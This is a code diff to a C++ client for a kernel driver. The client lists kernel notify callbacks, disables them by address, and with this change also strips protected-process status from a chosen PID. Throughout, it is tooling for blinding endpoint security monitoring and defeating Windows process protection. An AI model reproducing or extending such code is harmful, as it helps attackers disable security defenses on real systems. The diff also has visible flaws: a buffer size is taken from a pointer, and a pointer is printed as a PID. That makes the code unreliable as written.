@@ -24,11 +24,23 @@ int main(int argc, char * argv[])
 	if (success = DeviceIoControl(hDriver, IOCTL_WINDOWS_VERSION, nullptr, 0, &version, sizeof(version), nullptr, nullptr))
 	{
 		printf("Built for Windows Version 10.0.26100\nCurrent Windows Version: %lu.%lu.%lu\n", version.MajorVersion, version.MinorVersion, version.BuildNumber);
+		printf("Offsets set up as follows:\n"
+			"\tPROCESS_NOTIFY_OFFSET: 0x%llx\n"
+			"\tTHREAD_NOTIFY_OFFSET: 0x%llx\n"
+			"\tIMAGE_NOTIFY_OFFSET: 0x%llx\n"
+			"\tPS_PROTECTION_OFFSET: 0x%lx\n",
+			PROCESS_NOTIFY_OFFSET, THREAD_NOTIFY_OFFSET, IMAGE_NOTIFY_OFFSET, PS_PROTECTION_OFFSET);
 	}
 
 	if (argc < 2)
 	{
-		printf("Usage: .exe <int:toggle>\n\t1: LIST KERNEL MODULES\n\t2: LIST PROCESSNOTIFY CALLBACKS\n\t3: LIST THREADNOTIFY CALLBACKS\n\t4: LIST IMAGENOTIFY CALLBACKS\n\t5: DISABLE CALLBACK <PVOID>\n");
+		printf("Usage: .exe <int:toggle>\n\t"
+			"1: LIST KERNEL MODULES\n\t" 
+			"2: LIST PROCESSNOTIFY CALLBACKS\n\t"
+			"3: LIST THREADNOTIFY CALLBACKS\n\t"
+			"4: LIST IMAGENOTIFY CALLBACKS\n\t"
+			"5: DISABLE CALLBACK <PVOID:address>\n\t"
+			"6: REMOVE_PS_PROTECTION <int:PID>\n");
 		return 1;
 	}
 
@@ -89,6 +101,16 @@ int main(int argc, char * argv[])
 		if (success = DeviceIoControl(hDriver, IOCTL_CALLBACK_REMOVE, target, sizeof(target), nullptr, 0, nullptr, nullptr))
 		{
 			printf("[*] Removed callback @ 0x%llx\n", address);
+		}
+		break;
+	}
+	case 6:
+	{
+		printf("[*] IOCTL_REMOVE_PS_PROTECTION\n");
+		PTARGET_PROCESS target = new TARGET_PROCESS{ atoi(argv[2]) };
+		if (success = DeviceIoControl(hDriver, IOCTL_REMOVE_PS_PROTECTION, target, sizeof(target), nullptr, 0, nullptr, nullptr))
+		{
+			printf("[*] Removed protection from 0x%d\n", target);
 		}
 		break;
 	}
